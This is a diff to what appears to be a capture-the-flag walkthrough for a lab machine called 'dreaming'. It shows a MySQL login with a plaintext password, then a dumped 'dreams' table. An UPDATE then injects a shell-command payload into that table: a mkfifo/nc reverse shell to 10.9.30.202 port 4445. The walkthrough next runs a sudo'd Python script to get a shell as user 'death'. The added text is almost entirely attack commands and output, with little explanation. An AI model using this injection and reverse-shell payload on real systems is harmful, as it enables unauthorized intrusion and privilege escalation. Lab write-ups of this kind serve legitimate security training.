@@ -86,7 +86,47 @@ User lucien may run the following commands on dreaming:
 
 
 lucien@dreaming:~$ mysql -u lucien -plucien42DBPASSWORD
+mysql> use library
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+Database changed
+mysql> show tables;
++-------------------+
+| Tables_in_library |
++-------------------+
+| dreams            |
++-------------------+
+1 row in set (0.00 sec)
 
+mysql> select * from dreams;
++---------+------------------------------------+
+| dreamer | dream                              |
++---------+------------------------------------+
+| Alice   | Flying in the sky                  |
+| Bob     | Exploring ancient ruins            |
+| Carol   | Becoming a successful entrepreneur |
+| Dave    | Becoming a professional musician   |
++---------+------------------------------------+
+
+mysql> UPDATE dreams  set dreamer = 'id& rm', dream = ' /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.30.202 4445 >/tmp/f' WHERE dreamer = 'id& id';
+Query OK, 1 row affected (0.01 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql> select * from dreams;
++-----------------+--------------------------------------------------------------------------------+
+| dreamer         | dream                                                                          |
++-----------------+--------------------------------------------------------------------------------+
+| Alice           | Flying in the sky                                                              |
+| Bob             | Exploring ancient ruins                                                        |
+| Carol           | Becoming a successful entrepreneur                                             |
+| Dave            | Becoming a professional musician                                               |
+| id& rm          |  /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.30.202 4445 >/tmp/f |
++-----------------+--------------------------------------------------------------------------------+
+
+and run
+lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
+
+<h2>get reverse shell as death </h2>
 
 
 
